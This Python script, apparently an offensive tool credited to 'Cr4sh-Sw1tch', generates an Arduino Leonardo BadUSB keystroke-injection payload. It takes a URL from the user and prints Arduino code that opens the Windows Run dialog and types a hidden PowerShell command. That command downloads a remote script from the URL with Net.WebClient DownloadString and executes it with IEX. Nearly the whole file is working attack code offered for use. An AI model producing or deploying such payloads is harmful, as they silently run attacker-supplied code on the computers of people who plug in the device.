# -*- coding: utf-8 -*-

"""
Copyright © 2018 Tüm Hakları Saklıdır.
Author : Onur Güngör
https://www.facebook.com/onur.gungor.792
"""

class renkler:

    PEMBE = '\033[95m'
    MAVİ = '\033[94m'
    YESİL = '\033[92m'
    SARI = '\033[93m'
    KIRMIZI = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(renkler.YESİL + "")

banner =  "    ____            ___                __                                    __   \n"
banner += "   / __ )____ _____/ (_)___  ____     / /   ___  ____  ____  ____ __________/ /___ \n"
banner += "  / __  / __ `/ __  / / __ \/ __ \   / /   / _ \/ __ \/ __ \/ __ `/ ___/ __  / __ \ \n"
banner += " / /_/ / /_/ / /_/ / / / / / /_/ /  / /___/  __/ /_/ / / / / /_/ / /  / /_/ / /_/ / \n"
banner += "/_____/\__,_/\__,_/_/_/ /_/\____/  /_____/\___/\____/_/ /_/\__,_/_/   \__,_/\____/  \n"

print(banner)

author =  "+--------------------------------+"
author += "++Cr4sh-Sw1tch++"
author += "+-------------------------------+"

print(author)

print(renkler.MAVİ + "Example: example.com/badino.ps1")

print("")

url = input("[*] Url : ")

print(renkler.BOLD ,renkler.KIRMIZI+"")

#PAYLOAD

print("//Cr4sh-Sw1tch \n")
print("#include <Keyboard.h> \n")
print("void setup (){ \n")
print("Keyboard.begin(); ")
print("delay(100); \n")
print("Keyboard.press(KEY_LEFT_GUI); ")
print("Keyboard.press('r'); ")
print("Keyboard.releaseAll(); ")
print("delay(500); \n")
print("Keyboard.press(KEY_LEFT_SHIFT); ")
print("Keyboard.press(KEY_LEFT_ALT); ")
print("Keyboard.releaseAll(); ")
print("delay(200); \n")
print("Keyboard.press(KEY_LEFT_GUI); ")
print("Keyboard.press('r'); ")
print("Keyboard.releaseAll(); ")
print("delay(500); \n")
code1 = "Keyboard.print(\"powershell -windowstyle hidden IEX"
code1 += " (New-Object Net.WebClient).DownloadString"
code2 = "('http://" + url + "');\");"
print(code1,code2)
print("")
print("Keyboard.press(KEY_RETURN); ")
print("Keyboard.releaseAll(); ")
print("delay(1000); \n")
print("Keyboard.end(); \n")
print("} \n")
print("void loop () { \n")
print("} \n")


